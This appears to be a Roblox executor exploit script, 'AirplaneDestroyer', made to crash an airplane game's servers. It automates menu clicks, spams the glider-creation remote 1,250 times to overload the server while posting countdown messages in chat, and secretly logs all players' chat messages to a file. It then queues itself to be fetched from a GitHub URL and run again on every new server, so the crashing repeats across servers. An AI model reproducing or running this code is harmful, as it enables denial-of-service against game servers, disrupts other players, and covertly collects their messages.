local sTeleportService = game:GetService("TeleportService")
local sPlayers = game:GetService("Players")
local sWorkspace = game:GetService("Workspace")
local sReplicatedStorage = game:GetService("ReplicatedStorage")

local function Chat(message)
	sReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
end

local function BuildPower()
	Chat("Building power... starting")
	Chat("Lag may be experienced during this process, depending on your location in-game. Please be patient.")
	appendfile("chatlog.txt", "\nBuilding power...")
    	local gliderRemote = sPlayers.LocalPlayer.Backpack.Parachute.CreateGlider
    	for i = 1,1250 do
		if i == 750 then
			Chat("Building power... halfway done")
		end
		if i == 1000 then
			Chat("Building power... almost done")
		end
        	gliderRemote:FireServer()
        	wait()
    	end
	Chat("Building power... Done!")
	wait(15)
end

local function Crash()
	appendfile("chatlog.txt", "\nCrashing in 60 seconds...")
	Chat("Crashing server in 60 seconds...")
	wait(30)
	Chat("Crashing server in 30 seconds...")
	appendfile("chatlog.txt", "\nCrashing in 30 seconds...")
	wait(15)
	Chat("Crashing server in 15 seconds...")
	appendfile("chatlog.txt", "\nCrashing in 15 seconds...")
	wait(12)
	Chat("Crashing server in 3 seconds...")
	wait(1)
	Chat("Crashing server in 2 seconds...")
	wait(1)
	Chat("Crashing server in 1 second...")
	wait(1)
	appendfile("chatlog.txt", "\nCrashed!")
	Chat("Crashing server! Thanks for using AirplaneDestroyer!")
	wait(1)
	sPlayers.LocalPlayer.Character.Humanoid.Health = 0
end

local function SetupTeleport()
	for _,child in pairs(sWorkspace.OrenjiTerrain:GetChildren()) do
		if child.Name == "Terrain" then
			child:Destroy()
		end
	end
end

--local function Chatlog(message, name)
--    appendfile("chatlog.txt", "\n" .. message)
--end

Chatlog = function(player)
	player.Chatted:Connect(function(message)
		appendfile("chatlog.txt", "\n" .. player.Name .. ": " .. message)
	end)
end

local function RegisterPlayer(player)
	Chatlog(player)
end
 
local function Main()
	print("AirplaneDestroyer by ID17 loading...")
	appendfile("chatlog.txt", "\nAirplaneDestroyer loading...")
	wait(30)
	Chat("AirplaneDestroyer by ID17 loaded.")
	wait(0.1)
	Chat("The process is automatic.")
	wait(0.1)
	Chat("Please redirect any concerns or comments to ID17.")
	wait(0.1)
	Chat("Setting up...")

	for _,player in sPlayers:GetChildren() do
        	RegisterPlayer(player)
    	end

	sPlayers.PlayerAdded:Connect(function(player)
		RegisterPlayer(player)
	end)

	firesignal(game:GetService("Players").LocalPlayer.PlayerGui.GraphicsLevelGUI.ImageLabel.Normal.MouseButton1Click)
	firesignal(game:GetService("Players").LocalPlayer.PlayerGui.MainMenu.Menu.Left.Buttons.APlay.MouseButton1Click)
	firesignal(game:GetService("Players").LocalPlayer.PlayerGui.MainMenu.APlay.IslandSelection.IslandButtons.BOrenji.MouseButton1Click)
	repeat
		wait()
		mousemoveabs(425, 35) 
		mouse1click()
		mousemoveabs(250, 30) 
		mouse1click()
		mousemoveabs(350, 50) 
		mouse1click()
	until(sWorkspace:FindFirstChild("OrenjiTerrain"))
	SetupTeleport()
	sPlayers.LocalPlayer.Character:PivotTo(CFrame.new(-10480, 3, -32200))
	BuildPower()
	Crash()
	wait(210)
	queue_on_teleport(game:HttpGet("https://raw.githubusercontent.com/sonomukashi/airplane-destroyer/main/airplane-destroyer.lua"))
	wait(5)
	sTeleportService:Teleport(20321167)
end
 
Main()
